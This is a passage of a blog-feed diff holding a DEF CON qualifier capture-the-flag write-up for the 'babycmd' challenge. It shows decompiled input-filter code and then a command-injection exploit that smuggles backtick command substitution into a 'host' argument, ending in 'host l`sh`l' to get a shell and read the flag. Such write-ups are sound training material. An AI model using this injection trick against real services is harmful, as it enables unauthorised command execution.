-    if ( (unsigned __int8)((*(_BYTE *)v1 &amp; 0xDF) - 0x41) &lt;= 0x19u
-      || (result = 0LL, (unsigned __int8)(*(_BYTE *)v1 - 48) &lt;= 9u) )
-    {
-      v6 = *(_BYTE *)(v1 + v4 - 1 - 1);
-      result = 1LL;
-      if ( (unsigned __int8)((v6 &amp; 0xDF) - 0x41) &gt; 0x19u )
-        result = (unsigned __int8)(v6 - 0x30) &lt;= 9u;
-    }
-  }
-  return result;
-}
-</code></pre>
-
-<p>i just noticed that it filters some bytes but not chr(0x60) which can be used to execute command and tried some tests on input.</p>
-
-<p>finally i could run command like this:</p>
-
-<pre><code>$ ./babycmd_3ad28b10e8ab283d7df81795075f600b 
-
-Welcome to another Baby's First Challenge!
-Commands: ping, dig, host, exit
-: host l`ls`l
-host: 'lbabycmd_3ad28b10e8ab283d7df81795075f600b
-babycmd_3ad28b10e8ab283d7df81795075f600b.id0
-babycmd_3ad28b10e8ab283d7df81795075f600b.id1
-babycmd_3ad28b10e8ab283d7df81795075f600b.id2
-babycmd_3ad28b10e8ab283d7df81795075f600b.nam
-babycmd_3ad28b10e8ab283d7df81795075f600b.til
-logl' is not a legal name (label too long)
-Commands: ping, dig, host, exit
-: 
-</code></pre>
-
-<dl>
-<dt>but trying something like this <code>host l`ls /home/`l</code> can be seen below:</dt>
-<dt>&#8220;`</dt>
-<dt>Commands: ping, dig, host, exit</dt>
-<dd>host l<code>ls /home/</code>l</dd>
-<dt>sh: 1: ls/home/: not found</dt>
-<dt>Host ll not found: 3(NXDOMAIN)</dt>
-<dt>Commands: ping, dig, host, exit</dt>
-<dd><p>&#8220;`</p></dd>
-</dl>
-
-<p>it filters space, so i can&rsquo;t run any command.
-but instead of reversing the filter function, i can use <code>sh</code>, aren&rsquo;t i :)) ?</p>
-
-<p>So here&rsquo;s my points:</p>
-
-<ol>
-<li>enter <code>host l`sh`l</code> as command</li>
-<li>enter:<br/>
-<code>cat /home/babycmd/flag</code></li>
-<li>Press Ctrl+D</li>
-<li>Press Ctrl+C</li>
-</ol>
-
-
-<p>So here we go:</p>
-
-<pre><code>$ nc babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491
-Welcome to another Baby's First Challenge!
-Commands: ping, dig, host, exit
-: host l`sh`l
-cat /home/babycmd/flag [Enter] [Ctrl+D]
-: host: 'lThe flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??1' is not in legal name syntax (label too long)
-Commands: ping, dig, host, exit
-: ^C
-</code></pre>
-
-<p>So we have first 1 point at DEFCONCTF.</p>
 
 <p>@HAMIDx9</p>
 ]]></content>
